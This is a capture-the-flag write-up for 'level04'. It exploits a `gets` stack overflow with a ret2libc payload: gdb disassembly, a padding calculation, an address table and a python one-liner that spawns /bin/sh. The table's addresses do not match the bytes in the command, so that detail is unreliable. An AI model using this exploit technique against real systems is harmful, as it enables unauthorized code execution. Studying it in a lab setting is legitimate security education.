# Cant trace me (level04)

This [binary](source.c) is a simple case of `gets` being used and being as
vulnerable as ever. The all `fork`/`ptrace` setup just makes it hard to use gdb
on this program's child process. But this is not really needed. From gdb we
still can see how the stack looks like. We can compute how many bytes of padding
we need instead of seeing it empirically with test payloads as we do usually.

Since this is a classic `gets` buffer overflow we can overwrite by any number of
bytes we need, which means that we can simply execute a
[ret2libc](https://bufferoverflows.net/ret2libc-exploitation-example/) exploit.

```shell
# run gdb on the binary
gdb ./level04
(gdb) disass main
Dump of assembler code for function main:
   0x080486c8 <+0>:     push   %ebp
   0x080486c9 <+1>:     mov    %esp,%ebp
   0x080486cb <+3>:     push   %edi
   0x080486cc <+4>:     push   %ebx
   0x080486cd <+5>:     and    $0xfffffff0,%esp
   0x080486d0 <+8>:     sub    $0xb0,%esp
```

Two registers are pushed to the stack. Since this is a 32bit binary, this is 8
bytes of data. Then esp is aligned, so it is substracted by any value between 0
and 15 (inclusive). Then 0xb0 (176) is substracted from the esp pointer to
allocate the stack necessary to the _main_ function. So that's at least 184
bytes of stack for this function. The buffer given to `gets` starts at
exp + 0x20, which means we have to substract 32 bytes to get the length of the
stack we must overwrite to access _main_'s return address. Also we have to add 4
bytes because the goal is ebp + 4. So this amounts to: 8 + 176 - 32 + 4 = 156.
So we need at least 156 bytes of padding.

### Payload

| padding (156) | system (4) | exit (4)   | libc's "/bin/sh" string |
|---------------|------------|------------|-------------------------|
| 0x616161...   | 0xb7e6aed0 | 0xb7e5eb70 | 0xf7f897ec              |

```shell
(python -c 'print "a" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level04
```

And it works ;)
